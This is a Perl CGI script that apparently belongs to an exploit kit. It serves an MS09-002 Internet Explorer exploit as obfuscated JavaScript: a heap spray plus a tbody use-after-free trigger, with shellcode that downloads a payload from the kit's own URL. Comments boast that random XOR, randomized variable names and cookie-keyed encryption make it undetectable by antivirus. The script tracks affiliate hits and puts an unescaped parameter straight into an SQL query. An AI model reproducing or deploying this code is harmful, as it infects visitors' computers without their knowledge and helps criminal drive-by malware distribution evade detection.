#!/usr/bin/perl

#
# var randomizer for MS09_002 exploit (Windows XP SP2-SP3 / Windows Vista SP0 / IE 7.0)
# TESTED XP SP2 IE7 (WORKING)
# TESTED 2003 SP2 IE7 (WORKING)
# FUD for all AV using random XOR + random Vars + Replace string of eval
#

use CGI;
use DBI;
require "../lib/Shellcode.pm";
require "../lib/JsXOR.pm";
require "../lib/EncRand.pm";
require "../config.pl";

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

#Insert the view param on exploit
$sql = "UPDATE exploits SET ms09_002=ms09_002+1 WHERE affid='admin'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

$q = new CGI;

$aff = $q->param('aff');
$csname = $q->param('csname');

#Insert the view param on exploit
$sql = "UPDATE exploits SET ms09_002=ms09_002+1 WHERE affid='$aff'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

#get the cookie value from name
$theCookie = $q->cookie($csname);

#randomize vars
$rand1 = JsXOR::generate_random_string(int(rand 100));
$rand2 = JsXOR::generate_random_string(int(rand 100));
$rand3 = JsXOR::generate_random_string(int(rand 100));
$rand4 = JsXOR::generate_random_string(int(rand 100));
$rand5 = JsXOR::generate_random_string(int(rand 100));
$rand6 = JsXOR::generate_random_string(int(rand 100));
$rand7 = JsXOR::generate_random_string(int(rand 100));
$rand8 = JsXOR::generate_random_string(int(rand 100));
$rand9 = JsXOR::generate_random_string(int(rand 100));
$rand10 = JsXOR::generate_random_string(int(rand 100));
$rand11 = JsXOR::generate_random_string(int(rand 100));
$rand12 = JsXOR::generate_random_string(int(rand 100));
$rand13 = JsXOR::generate_random_string(int(rand 100));
$fill = JsXOR::generate_random_string(25);

#exec code vars
$ret = '%u0c0c%u0c0c';
$urlllll = $config{UrlToFolder} . '/loads.pl?aff=' . $aff . '&xplload=ms09_002';
$shellcode = Shellcode::getshell($urlllll);

#HTML DATA
my $data = <<EOF;

var $rand1 = unescape("$shellcode\");
var $rand2 = new Array();
var $rand3 = 0x100000-($rand1.length*2+0x01020);
var $rand4 = unescape("$ret");
while($rand4.length<$rand3/2)
{$rand4+=$rand4;}
var $rand5 = $rand4.substring(0,$rand3/2);
delete $rand4;
for($rand6=0;$rand6<0xC0;$rand6++)
{$rand2\[$rand6\] = $rand5 + $rand1;}
CollectGarbage();
var $rand7 = unescape("$ret"+"$fill");
var $rand8 = new Array();
for(var $rand9=0;$rand9<1000;$rand9++)
$rand8.push(document.createElement("img"));
function $rand10() 
{
	$rand11 = document.createElement("tbody");
	$rand11.click;
	var $rand12 = $rand11.cloneNode();
	$rand11.clearAttributes();
	$rand11=null;
	CollectGarbage();
	for(var $rand13=0;$rand13<$rand8.length;$rand13++)
	$rand8\[$rand13\].src=$rand7;
	$rand12.click;
}
window.setTimeout("$rand10();",800);

EOF

my $headersdata = <<REOF;
<html>
<head>
<script language="JavaScript">
REOF

#$beforexoredd = JsXOR::excryptxorjs($data);
$beforexoredd = EncRand::CsCrypt($data,$csname,$theCookie);

###### BEGIN PRINT EXPLOIT #########
print $q->header(-p3p => 'IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT');

print "$headersdata";

print $beforexoredd;

print '</script></head><body></body></html>';

####### END PRINT EXPLOIT ##########

$dbh->disconnect();

1;
